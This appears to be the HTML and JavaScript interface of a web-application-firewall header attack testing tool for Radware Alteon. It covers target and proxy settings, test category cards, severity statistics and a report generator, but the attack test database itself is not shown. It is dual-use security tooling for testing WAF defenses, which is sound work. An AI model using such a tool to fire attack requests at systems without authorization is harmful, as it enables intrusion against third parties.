<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WAF Header Attack Testing Suite | Professional Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }
        
        .tech-gradient {
            background: linear-gradient(135deg, #0ea5e9 0%, #06b6d4 100%);
        }
        
        .card-hover {
            transition: all 0.2s ease;
            border: 1px solid #e5e7eb;
        }
        
        .card-hover:hover {
            border-color: #06b6d4;
            box-shadow: 0 4px 12px rgba(6, 182, 212, 0.15);
            transform: translateY(-2px);
        }
        
        .test-selected {
            background-color: #f0fdfa;
            border-color: #06b6d4;
        }
        
        .code-output {
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            background: #0f172a;
            color: #e2e8f0;
            line-height: 1.5;
        }
        
        .tab-active {
            border-bottom: 2px solid #06b6d4;
            color: #0891b2;
        }
        
        .severity-critical { color: #dc2626; background: #fee2e2; }
        .severity-high { color: #ea580c; background: #fed7aa; }
        .severity-medium { color: #ca8a04; background: #fef3c7; }
        .severity-low { color: #0891b2; background: #e0f2fe; }
        
        /* Modern scrollbar */
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #f1f5f9; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
        
        .loading-spinner {
            border: 2px solid #f3f4f6;
            border-top: 2px solid #06b6d4;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .fade-in {
            animation: fadeIn 0.3s ease-in;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body class="bg-gray-50 text-gray-900">
    <!-- Header -->
    <header class="bg-white border-b border-gray-200 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-16">
                <div class="flex items-center">
                    <i class="fas fa-shield-alt text-2xl text-cyan-600 mr-3"></i>
                    <div>
                        <h1 class="text-xl font-semibold">WAF Header Attack Testing Suite</h1>
                        <p class="text-xs text-gray-500">Professional Edition for Alteon Radware</p>
                    </div>
                </div>
                <div class="flex items-center space-x-6">
                    <div class="text-right">
                        <p class="text-sm text-gray-600">Selected: <span id="selectedCount" class="font-semibold text-cyan-600">0</span></p>
                        <p class="text-xs text-gray-500">Total: <span id="totalCount">0</span> tests</p>
                    </div>
                    <button onclick="showHelp()" class="text-gray-500 hover:text-gray-700 transition">
                        <i class="fas fa-question-circle text-xl"></i>
                    </button>
                </div>
            </div>
        </div>
    </header>

    <!-- Quick Actions -->
    <div class="bg-white border-b border-gray-200">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
            <div class="flex flex-wrap gap-2 items-center justify-between">
                <div class="flex flex-wrap gap-2">
                    <button onclick="selectPreset('critical')" class="px-3 py-1.5 bg-red-50 text-red-700 rounded-md hover:bg-red-100 transition text-sm font-medium">
                        <i class="fas fa-exclamation-triangle mr-1"></i>Critical Tests
                    </button>
                    <button onclick="selectPreset('common')" class="px-3 py-1.5 bg-blue-50 text-blue-700 rounded-md hover:bg-blue-100 transition text-sm font-medium">
                        <i class="fas fa-fire mr-1"></i>Common Attacks
                    </button>
                    <button onclick="selectPreset('comprehensive')" class="px-3 py-1.5 bg-green-50 text-green-700 rounded-md hover:bg-green-100 transition text-sm font-medium">
                        <i class="fas fa-shield-check mr-1"></i>Full Suite
                    </button>
                    <button onclick="selectPreset('quick')" class="px-3 py-1.5 bg-yellow-50 text-yellow-700 rounded-md hover:bg-yellow-100 transition text-sm font-medium">
                        <i class="fas fa-bolt mr-1"></i>Quick Test
                    </button>
                </div>
                <div class="flex gap-2">
                    <button onclick="selectAll()" class="text-gray-600 hover:text-gray-800 text-sm">
                        <i class="fas fa-check-square mr-1"></i>Select All
                    </button>
                    <button onclick="clearAll()" class="text-gray-600 hover:text-gray-800 text-sm">
                        <i class="fas fa-times mr-1"></i>Clear
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
        <!-- Configuration -->
        <div class="bg-white rounded-lg shadow-sm border border-gray-200 mb-6 p-6">
            <h2 class="text-lg font-semibold mb-4 flex items-center">
                <i class="fas fa-cog text-gray-400 mr-2"></i>Configuration
            </h2>
            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-1">Target URL</label>
                    <input type="text" id="targetUrl" value="http://target.com" 
                           class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-1">Proxy (Optional)</label>
                    <input type="text" id="proxyUrl" placeholder="http://127.0.0.1:8080" 
                           class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-1">Output Format</label>
                    <select id="outputFormat" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                        <option value="curl">cURL Commands</option>
                        <option value="python">Python Script</option>
                        <option value="raw">Raw HTTP</option>
                    </select>
                </div>
            </div>
        </div>

        <!-- Search and Filter -->
        <div class="bg-white rounded-lg shadow-sm border border-gray-200 mb-6 p-4">
            <div class="flex flex-wrap gap-3">
                <div class="flex-1 min-w-[200px]">
                    <div class="relative">
                        <i class="fas fa-search absolute left-3 top-2.5 text-gray-400"></i>
                        <input type="text" id="searchBox" placeholder="Search tests..." 
                               onkeyup="filterTests()"
                               class="w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                    </div>
                </div>
                <select id="categoryFilter" onchange="filterTests()" 
                        class="px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                    <option value="">All Categories</option>
                </select>
                <select id="severityFilter" onchange="filterTests()"
                        class="px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                    <option value="">All Severities</option>
                    <option value="critical">Critical</option>
                    <option value="high">High</option>
                    <option value="medium">Medium</option>
                    <option value="low">Low</option>
                </select>
            </div>
        </div>




<script>// Generate category cards with improved design
function generateCategoryCards() {
    const categoryCardsContainer = document.getElementById('categoryCards');
    if (!categoryCardsContainer) return;
    
    categoryCardsContainer.innerHTML = '';
    
    Object.keys(testDatabase).forEach(categoryName => {
        const category = testDatabase[categoryName];
        const tests = category.tests;
        
        // Count tests by severity
        const severityCounts = {
            critical: tests.filter(t => t.severity === 'critical').length,
            high: tests.filter(t => t.severity === 'high').length,
            medium: tests.filter(t => t.severity === 'medium').length,
            low: tests.filter(t => t.severity === 'low').length
        };
        
        // Get the highest severity for card highlighting
        let cardClass = 'border-gray-200';
        if (severityCounts.critical > 0) cardClass = 'border-red-200';
        else if (severityCounts.high > 0) cardClass = 'border-orange-200';
        else if (severityCounts.medium > 0) cardClass = 'border-yellow-200';
        
        const card = document.createElement('div');
        card.className = `border ${cardClass} rounded-lg p-4 hover:shadow-md transition cursor-pointer bg-white relative overflow-hidden`;
        card.dataset.category = categoryName;
        
        // Add a subtle background pattern for visual interest
        const pattern = document.createElement('div');
        pattern.className = 'absolute top-0 right-0 w-24 h-24 opacity-5';
        pattern.innerHTML = `<i class="fas ${category.icon} text-6xl transform rotate-12 translate-x-6 -translate-y-2"></i>`;
        card.appendChild(pattern);
        
        const contentDiv = document.createElement('div');
        contentDiv.className = 'relative z-10'; // Make sure content is above the pattern
        contentDiv.innerHTML = `
            <div class="flex justify-between items-start mb-3">
                <h4 class="font-semibold text-gray-800 flex items-center">
                    <i class="fas ${category.icon} text-cyan-600 mr-2"></i>
                    <span class="truncate max-w-[150px]" title="${categoryName}">${categoryName}</span>
                </h4>
            </div>
            <div class="flex justify-between items-center mb-3">
                <span class="text-sm text-gray-600">${tests.length} tests</span>
                <button class="category-toggle text-xs bg-cyan-50 text-cyan-700 hover:bg-cyan-100 px-2 py-1 rounded-md shadow-sm" 
                        onclick="toggleCategory('${categoryName}', event)">
                    Select All
                </button>
            </div>
            <div class="flex flex-wrap gap-1.5">
                ${severityCounts.critical ? `<span class="px-1.5 py-0.5 rounded-full text-xs bg-red-100 text-red-700 flex items-center"><i class="fas fa-exclamation-circle mr-1 text-red-600"></i>${severityCounts.critical}</span>` : ''}
                ${severityCounts.high ? `<span class="px-1.5 py-0.5 rounded-full text-xs bg-orange-100 text-orange-700 flex items-center"><i class="fas fa-exclamation-triangle mr-1 text-orange-600"></i>${severityCounts.high}</span>` : ''}
                ${severityCounts.medium ? `<span class="px-1.5 py-0.5 rounded-full text-xs bg-yellow-100 text-yellow-700 flex items-center"><i class="fas fa-exclamation mr-1 text-yellow-600"></i>${severityCounts.medium}</span>` : ''}
                ${severityCounts.low ? `<span class="px-1.5 py-0.5 rounded-full text-xs bg-blue-100 text-blue-700 flex items-center"><i class="fas fa-info-circle mr-1 text-blue-600"></i>${severityCounts.low}</span>` : ''}
            </div>
            <div class="mt-3 h-1 bg-gray-200 rounded-full overflow-hidden">
                <div class="flex h-full">
                    <div class="bg-red-500 h-full" style="width: ${tests.length > 0 ? (severityCounts.critical / tests.length) * 100 : 0}%"></div>
                    <div class="bg-orange-500 h-full" style="width: ${tests.length > 0 ? (severityCounts.high / tests.length) * 100 : 0}%"></div>
                    <div class="bg-yellow-500 h-full" style="width: ${tests.length > 0 ? (severityCounts.medium / tests.length) * 100 : 0}%"></div>
                    <div class="bg-blue-500 h-full" style="width: ${tests.length > 0 ? (severityCounts.low / tests.length) * 100 : 0}%"></div>
                </div>
            </div>
        `;
        card.appendChild(contentDiv);
        
        // Add click event to navigate to category
        card.addEventListener('click', function(e) {
            // Don't navigate if clicking on the toggle button
            if (e.target.closest('.category-toggle')) return;
            
            const categoryElement = document.querySelector(`div[data-category="${categoryName}"]:not([id="categoryCards"] div)`);
            if (categoryElement) {
                categoryElement.scrollIntoView({ behavior: 'smooth' });
                
                // Highlight the category briefly
                categoryElement.classList.add('bg-cyan-50');
                setTimeout(() => {
                    categoryElement.classList.remove('bg-cyan-50');
                }, 1500);
            }
        });
        
        categoryCardsContainer.appendChild(card);
    });
}

// Toggle all tests in a category
function toggleCategory(categoryName, event) {
    event.stopPropagation();
    
    const button = event.target.closest('.category-toggle');
    const isSelecting = button.textContent.trim() === 'Select All';
    
    // Find all test items in this category
    const categoryTests = document.querySelectorAll(`.test-item[data-category="${categoryName}"]`);
    
    categoryTests.forEach(item => {
        const checkbox = item.querySelector('.test-checkbox');
        checkbox.checked = isSelecting;
        item.classList.toggle('test-selected', isSelecting);
    });
    
    // Update button text and styling for all buttons with this category
    document.querySelectorAll(`.category-toggle`).forEach(btn => {
        if (btn.closest('[data-category]')?.dataset.category === categoryName) {
            btn.textContent = isSelecting ? 'Deselect All' : 'Select All';
            btn.classList.toggle('bg-cyan-50', !isSelecting);
            btn.classList.toggle('text-cyan-700', !isSelecting);
            btn.classList.toggle('bg-gray-100', isSelecting);
            btn.classList.toggle('text-gray-700', isSelecting);
        }
    });
    
    updateCounts();
    updateStatistics();
}

// Update test statistics with enhanced visuals
function updateStatistics() {
    // Get all tests
    const allTests = [];
    Object.keys(testDatabase).forEach(categoryName => {
        testDatabase[categoryName].tests.forEach(test => {
            allTests.push({
                category: categoryName,
                ...test
            });
        });
    });
    
    // Count by severity
    const severityCounts = {
        critical: allTests.filter(t => t.severity === 'critical').length,
        high: allTests.filter(t => t.severity === 'high').length,
        medium: allTests.filter(t => t.severity === 'medium').length,
        low: allTests.filter(t => t.severity === 'low').length
    };
    
    const totalTests = allTests.length;
    
    // Count selected tests
    const selectedTests = Array.from(document.querySelectorAll('.test-checkbox:checked')).length;
    
    // Update the selected/total counters
    document.getElementById('statsSelectedCount').textContent = `${selectedTests} Selected`;
    document.getElementById('statsTotalCount').textContent = `${totalTests} Total`;
    
    // Update severity stats
    const severityStatsDiv = document.getElementById('severityStats');
    if (severityStatsDiv) {
        severityStatsDiv.innerHTML = `
            <div class="bg-red-50 rounded-lg p-3 flex flex-col">
                <div class="flex justify-between items-center">
                    <span class="text-red-800 font-medium">Critical</span>
                    <span class="bg-red-100 text-red-800 px-2 py-0.5 rounded-full font-bold">${severityCounts.critical}</span>
                </div>
                <div class="text-xs text-red-600 mt-1">${Math.round((severityCounts.critical / totalTests) * 100)}% of tests</div>
                <div class="mt-2 text-xs text-red-700 flex items-center">
                    <i class="fas fa-exclamation-circle mr-1"></i> Immediate action needed
                </div>
            </div>
            
            <div class="bg-orange-50 rounded-lg p-3 flex flex-col">
                <div class="flex justify-between items-center">
                    <span class="text-orange-800 font-medium">High</span>
                    <span class="bg-orange-100 text-orange-800 px-2 py-0.5 rounded-full font-bold">${severityCounts.high}</span>
                </div>
                <div class="text-xs text-orange-600 mt-1">${Math.round((severityCounts.high / totalTests) * 100)}% of tests</div>
                <div class="mt-2 text-xs text-orange-700 flex items-center">
                    <i class="fas fa-exclamation-triangle mr-1"></i> High priority fixes
                </div>
            </div>
            
            <div class="bg-yellow-50 rounded-lg p-3 flex flex-col">
                <div class="flex justify-between items-center">
                    <span class="text-yellow-800 font-medium">Medium</span>
                    <span class="bg-yellow-100 text-yellow-800 px-2 py-0.5 rounded-full font-bold">${severityCounts.medium}</span>
                </div>
                <div class="text-xs text-yellow-600 mt-1">${Math.round((severityCounts.medium / totalTests) * 100)}% of tests</div>
                <div class="mt-2 text-xs text-yellow-700 flex items-center">
                    <i class="fas fa-exclamation mr-1"></i> Moderate risk
                </div>
            </div>
            
            <div class="bg-blue-50 rounded-lg p-3 flex flex-col">
                <div class="flex justify-between items-center">
                    <span class="text-blue-800 font-medium">Low</span>
                    <span class="bg-blue-100 text-blue-800 px-2 py-0.5 rounded-full font-bold">${severityCounts.low}</span>
                </div>
                <div class="text-xs text-blue-600 mt-1">${Math.round((severityCounts.low / totalTests) * 100)}% of tests</div>
                <div class="mt-2 text-xs text-blue-700 flex items-center">
                    <i class="fas fa-info-circle mr-1"></i> Low priority
                </div>
            </div>
        `;
    }
    
    // Update severity bars
    if (document.getElementById('criticalBar')) {
        document.getElementById('criticalBar').style.width = `${(severityCounts.critical / totalTests) * 100}%`;
        document.getElementById('highBar').style.width = `${(severityCounts.high / totalTests) * 100}%`;
        document.getElementById('mediumBar').style.width = `${(severityCounts.medium / totalTests) * 100}%`;
        document.getElementById('lowBar').style.width = `${(severityCounts.low / totalTests) * 100}%`;
    }
    
    // Count by category
    const categoryCounts = {};
    allTests.forEach(test => {
        if (!categoryCounts[test.category]) {
            categoryCounts[test.category] = 0;
        }
        categoryCounts[test.category]++;
    });
    
    // Sort categories by test count
    const sortedCategories = Object.entries(categoryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5); // Top 5 categories
    
    // Update category stats
    const categoryStatsDiv = document.getElementById('categoryStats');
    if (categoryStatsDiv) {
        categoryStatsDiv.innerHTML = '';
        
        sortedCategories.forEach(([category, count], index) => {
            const percentage = (count / totalTests) * 100;
            const colors = [
                'bg-cyan-500', 'bg-purple-500', 'bg-green-500', 
                'bg-indigo-500', 'bg-pink-500', 'bg-teal-500'
            ];
            const color = colors[index % colors.length];
            
            const div = document.createElement('div');
            div.className = 'bg-gray-50 rounded-lg p-3';
            div.innerHTML = `
                <div class="flex justify-between items-center mb-1">
                    <span class="text-sm font-medium text-gray-700">${category}</span>
                    <span class="text-sm text-gray-500">${count} tests</span>
                </div>
                <div class="h-2 bg-gray-200 rounded-full overflow-hidden">
                    <div class="${color} h-full" style="width: ${percentage}%"></div>
                </div>
                <div class="mt-1 flex justify-between">
                    <span class="text-xs text-gray-500">${percentage.toFixed(1)}% of all tests</span>
                    <span class="text-xs text-gray-500 cursor-pointer hover:text-cyan-600" 
                          onclick="scrollToCategory('${category}')">
                        <i class="fas fa-arrow-right"></i> View
                    </span>
                </div>
            `;
            categoryStatsDiv.appendChild(div);
        });
    }
}

// Function to scroll to a category when clicking "View"
function scrollToCategory(categoryName) {
    const categoryElement = document.querySelector(`div[data-category="${categoryName}"]:not([id="categoryCards"] div)`);
    if (categoryElement) {
        categoryElement.scrollIntoView({ behavior: 'smooth' });
        
        // Highlight the category briefly
        categoryElement.classList.add('bg-cyan-50');
        setTimeout(() => {
            categoryElement.classList.remove('bg-cyan-50');
        }, 1500);
    }
}

// Modify the existing init function to include our new features
function init() {
    populateFilters();
    renderTests();
    generateCategoryCards();
    updateCounts();
    updateStatistics();
}

// Modify the existing updateCounts function to also update statistics
function updateCounts() {
    const total = document.querySelectorAll('.test-checkbox').length;
    const selected = document.querySelectorAll('.test-checkbox:checked').length;
    
    document.getElementById('totalCount').textContent = total;
    document.getElementById('selectedCount').textContent = selected;
    document.getElementById('selectedBadge').textContent = selected;
    
    updateStatistics();
}

// Update the select/clear all functions
function selectAll() {
    document.querySelectorAll('.test-item').forEach(item => {
        item.querySelector('.test-checkbox').checked = true;
        item.classList.add('test-selected');
    });
    updateCounts();
    
    // Update category toggle buttons
    document.querySelectorAll('.category-toggle').forEach(btn => {
        btn.textContent = 'Deselect All';
        btn.classList.remove('bg-cyan-50', 'text-cyan-700');
        btn.classList.add('bg-gray-100', 'text-gray-700');
    });
}

function clearAll() {
    document.querySelectorAll('.test-item').forEach(item => {
        item.querySelector('.test-checkbox').checked = false;
        item.classList.remove('test-selected');
    });
    updateCounts();
    
    // Update category toggle buttons
    document.querySelectorAll('.category-toggle').forEach(btn => {
        btn.textContent = 'Select All';
        btn.classList.add('bg-cyan-50', 'text-cyan-700');
        btn.classList.remove('bg-gray-100', 'text-gray-700');
    });
}</script>















<!-- Category Cards Section -->
<div class="bg-white rounded-lg shadow-sm border border-gray-200 mb-6 p-6">
    <h2 class="text-lg font-semibold mb-4">Test Categories</h2>
    <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4" id="categoryCardsList">
        <!-- Cards will be added here by JavaScript -->
    </div>
</div>

<script>// Function to create the category cards
function createCategoryCards() {
    const container = document.getElementById('categoryCardsList');
    if (!container) return;
    
    container.innerHTML = '';
    
    Object.keys(testDatabase).forEach(category => {
        const tests = testDatabase[category].tests;
        const icon = testDatabase[category].icon || 'fa-folder';
        
        // Count tests by severity
        const criticalCount = tests.filter(t => t.severity === 'critical').length;
        const highCount = tests.filter(t => t.severity === 'high').length;
        
        // Create the card
        const card = document.createElement('div');
        card.className = 'bg-white border rounded-lg overflow-hidden shadow-sm hover:shadow-md transition cursor-pointer';
        card.onclick = () => scrollToTestCategory(category);
        
        // Determine border color based on highest severity
        if (criticalCount > 0) {
            card.classList.add('border-red-300');
        } else if (highCount > 0) {
            card.classList.add('border-orange-300');
        } else {
            card.classList.add('border-gray-200');
        }
        
        card.innerHTML = `
            <div class="p-4">
                <div class="flex items-center mb-2">
                    <i class="fas ${icon} text-cyan-600 mr-2"></i>
                    <h3 class="font-semibold text-gray-800">${category}</h3>
                </div>
                <p class="text-sm text-gray-600">${tests.length} tests</p>
                <div class="flex mt-2 gap-2">
                    ${criticalCount > 0 ? `<span class="px-2 py-1 text-xs bg-red-100 text-red-800 rounded">${criticalCount} Critical</span>` : ''}
                    ${highCount > 0 ? `<span class="px-2 py-1 text-xs bg-orange-100 text-orange-800 rounded">${highCount} High</span>` : ''}
                </div>
            </div>
        `;
        
        container.appendChild(card);
    });
}

// Function to scroll to a test category
function scrollToTestCategory(category) {
    const element = document.querySelector(`div[data-category="${category}"]:not([id="categoryCardsList"] div)`);
    if (element) {
        element.scrollIntoView({ behavior: 'smooth' });
        
        // Highlight the category briefly
        element.classList.add('bg-cyan-50');
        setTimeout(() => {
            element.classList.remove('bg-cyan-50');
        }, 1000);
    }
}

// Call this function when the page loads
document.addEventListener('DOMContentLoaded', function() {
    createCategoryCards();
});</script>


















        <!-- Test Categories -->
        <div id="testContainer" class="space-y-4">
            <!-- Categories will be inserted here -->
        </div>

        <!-- Generate Button -->
        <div class="fixed bottom-6 right-6">
            <button onclick="generateCommands()" 
                    class="bg-cyan-600 text-white px-6 py-3 rounded-lg shadow-lg hover:bg-cyan-700 transition flex items-center">
                <i class="fas fa-terminal mr-2"></i>Generate Commands
                <span id="selectedBadge" class="ml-2 bg-white text-cyan-600 px-2 py-0.5 rounded-full text-sm font-semibold">0</span>
            </button>
        </div>
    </main>

    <!-- Output Modal -->
    <div id="outputModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden">
        <div class="flex items-center justify-center min-h-screen p-4">
            <div class="bg-white rounded-lg shadow-xl w-full max-w-4xl max-h-[80vh] overflow-hidden">
                <div class="bg-gray-50 border-b border-gray-200 px-6 py-4 flex justify-between items-center">
                    <h3 class="text-lg font-semibold">Generated Commands</h3>
                    <div class="flex gap-2">
                        <button onclick="copyCommands()" class="px-3 py-1.5 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-sm">
                            <i class="fas fa-copy mr-1"></i>Copy
                        </button>
                        <button onclick="downloadCommands()" class="px-3 py-1.5 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-sm">
                            <i class="fas fa-download mr-1"></i>Download
                        </button>
                        <button onclick="closeModal()" class="text-gray-500 hover:text-gray-700">
                            <i class="fas fa-times"></i>
                        </button>
                    </div>
                </div>
                <div class="p-6 overflow-y-auto" style="max-height: 60vh;">
                    <pre id="outputContent" class="code-output p-4 rounded-lg text-sm overflow-x-auto"></pre>
                </div>
            </div>
        </div>
    </div>














































































































<!-- Advanced WAF Header Attack Test Report Generator - Enterprise Edition -->

<!-- Required Libraries -->
<script src="https://cdn.sheetjs.com/xlsx-0.20.3/package/dist/xlsx.full.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script src="https://cdn.jsdelivr.net/npm/luxon@3.4.3/build/global/luxon.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/file-saver@2.0.5/dist/FileSaver.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js"></script>

<!-- Report Generator UI -->
<div class="waf-report-generator-container">
    <!-- Floating Action Button -->
    <div class="waf-report-fab">
        <button id="wafReportFabButton" class="waf-report-fab-button pulse-animation" onclick="toggleReportPanel()">
            <i class="fas fa-file-excel"></i>
        </button>
        <span class="waf-report-fab-label">Excel Report Generator</span>
    </div>

    <!-- Report Configuration Panel -->
    <div id="wafReportPanel" class="waf-report-panel">
        <div class="waf-report-panel-header">
            <h2><i class="fas fa-chart-bar"></i> WAF Attack Report Generator</h2>
            <button class="waf-report-panel-close" onclick="toggleReportPanel()">
                <i class="fas fa-times"></i>
            </button>
        </div>
        
        <div class="waf-report-panel-content">
            <!-- Report Preview Tabs -->
            <div class="waf-report-tabs">
                <button class="waf-report-tab active" onclick="switchTab(this, 'waf-options')">Options</button>
                <button class="waf-report-tab" onclick="switchTab(this, 'waf-preview')">Preview</button>
                <button class="waf-report-tab" onclick="switchTab(this, 'waf-templates')">Templates</button>
                <button class="waf-report-tab" onclick="switchTab(this, 'waf-history')">History</button>
            </div>
            
            <!-- Options Tab Content -->
            <div id="waf-options" class="waf-report-tab-content active">
                <div class="waf-report-options-section">
                    <h3>Report Information</h3>
                    <div class="waf-report-option-group">
                        <label for="wafReportTitle">Report Title</label>
                        <input type="text" id="wafReportTitle" value="WAF Header Attack Test Report" placeholder="Enter report title">
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label for="wafCompanyName">Company Name</label>
                        <input type="text" id="wafCompanyName" placeholder="Enter company name">
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label for="wafReportAuthor">Author</label>
                        <input type="text" id="wafReportAuthor" placeholder="Enter report author">
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label>Report Format</label>
                        <div class="waf-report-radio-group">
                            <label class="waf-report-radio">
                                <input type="radio" name="wafReportFormat" value="xlsx" checked>
                                <span>Excel (.xlsx)</span>
                            </label>
                            <label class="waf-report-radio">
                                <input type="radio" name="wafReportFormat" value="csv">
                                <span>CSV</span>
                            </label>
                        </div>
                    </div>
                </div>
                
                <div class="waf-report-options-section">
                    <h3>Content Options</h3>
                    <div class="waf-report-checkbox-group">
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeExecutiveSummary" checked>
                            <span>Executive Summary</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeDetailedAnalysis" checked>
                            <span>Detailed Analysis</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeStatistics" checked>
                            <span>Statistics Dashboard</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeCharts" checked>
                            <span>Visualization Charts</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludePayloads" checked>
                            <span>Full Payloads</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeCurlCommands" checked>
                            <span>cURL Commands</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeRecommendations" checked>
                            <span>Remediation Recommendations</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeShellScript" checked>
                            <span>Shell Script Generator</span>
                        </label>
                    </div>
                </div>
                
                <div class="waf-report-options-section">
                    <h3>Payload Options</h3>
                    <div class="waf-report-option-group">
                        <label for="wafRequestMethod">Request Method</label>
                        <select id="wafRequestMethod" class="waf-select">
                            <option value="GET">GET</option>
                            <option value="POST">POST</option>
                            <option value="PUT">PUT</option>
                            <option value="DELETE">DELETE</option>
                            <option value="HEAD">HEAD</option>
                            <option value="OPTIONS">OPTIONS</option>
                        </select>
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label>Additional Headers</label>
                        <div id="wafAdditionalHeaders" class="waf-additional-headers">
                            <div class="waf-header-row">
                                <input type="text" placeholder="Header name" class="waf-header-name">
                                <input type="text" placeholder="Header value" class="waf-header-value">
                                <button class="waf-header-remove" onclick="removeHeaderRow(this)">
                                    <i class="fas fa-times"></i>
                                </button>
                            </div>
                        </div>
                        <button class="waf-add-header" onclick="addHeaderRow()">
                            <i class="fas fa-plus"></i> Add Header
                        </button>
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label for="wafCurlFormat">cURL Format</label>
                        <select id="wafCurlFormat" class="waf-select">
                            <option value="basic">Basic</option>
                            <option value="verbose" selected>Verbose (-v)</option>
                            <option value="insecure">Ignore SSL (-k)</option>
                            <option value="full">Full Options (-v -k)</option>
                        </select>
                    </div>
                </div>
                
                <div class="waf-report-options-section">
                    <h3>Appearance</h3>
                    <div class="waf-report-option-group">
                        <label>Color Theme</label>
                        <div class="waf-report-color-options">
                            <label class="waf-report-color-option">
                                <input type="radio" name="wafColorTheme" value="professional" checked>
                                <span class="color-preview professional"></span>
                                <span>Professional</span>
                            </label>
                            <label class="waf-report-color-option">
                                <input type="radio" name="wafColorTheme" value="corporate">
                                <span class="color-preview corporate"></span>
                                <span>Corporate</span>
                            </label>
                            <label class="waf-report-color-option">
                                <input type="radio" name="wafColorTheme" value="technical">
                                <span class="color-preview technical"></span>
                                <span>Technical</span>
                            </label>
                            <label class="waf-report-color-option">
                                <input type="radio" name="wafColorTheme" value="security">
                                <span class="color-preview security"></span>
                                <span>Security</span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label for="wafLogoUpload">Company Logo (optional)</label>
                        <input type="file" id="wafLogoUpload" accept="image/*">
                    </div>
                </div>
            </div>
            
            <!-- Preview Tab Content -->
            <div id="waf-preview" class="waf-report-tab-content">
                <div class="waf-report-preview-container">
                    <div class="waf-report-preview-header">
                        <select id="wafPreviewSheet" onchange="updateWafPreview()">
                            <option value="executiveSummary">Executive Summary</option>
                            <option value="detailedAnalysis">Detailed Analysis</option>
                            <option value="statistics">Statistics</option>
                            <option value="curlCommands">cURL Commands</option>
                            <option value="shellScript">Shell Script</option>
                        </select>
                        <div class="waf-report-preview-controls">
                            <button class="waf-preview-control" onclick="refreshWafPreview()">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    
                    <div class="waf-report-preview-content">
                        <div id="wafPreviewContent">
                            <!-- Preview content will be generated here -->
                            <div class="waf-preview-placeholder">
                                <i class="fas fa-table"></i>
                                <p>Select tests and configure options to generate preview</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Templates Tab Content -->
            <div id="waf-templates" class="waf-report-tab-content">
                <div class="waf-report-templates-grid">
                    <div class="waf-report-template-card" onclick="selectWafTemplate('executive')">
                        <div class="waf-template-thumbnail executive">
                            <i class="fas fa-briefcase"></i>
                        </div>
                        <div class="waf-template-info">
                            <h4>Executive Report</h4>
                            <p>Concise overview with key metrics and findings</p>
                        </div>
                        <div class="waf-template-select">
                            <i class="fas fa-check-circle"></i>
                        </div>
                    </div>
                    
                    <div class="waf-report-template-card" onclick="selectWafTemplate('technical')">
                        <div class="waf-template-thumbnail technical">
                            <i class="fas fa-code"></i>
